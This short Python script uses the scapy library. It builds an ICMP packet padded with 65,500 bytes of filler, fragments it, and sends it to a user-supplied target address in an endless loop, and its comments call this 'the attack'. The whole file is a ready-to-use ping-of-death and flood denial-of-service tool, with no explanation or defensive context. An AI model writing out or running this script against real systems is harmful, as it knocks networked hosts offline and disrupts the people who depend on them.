from scapy.all import *

target_ip = None # insert target ip

# forge the packet
ip = IP(dst=target_ip)
icmp = ICMP()
raw = Raw(b'X'*65500)

packet = ip / icmp / raw

# start the attack
send(fragment(packet), loop=1, verbose=0)


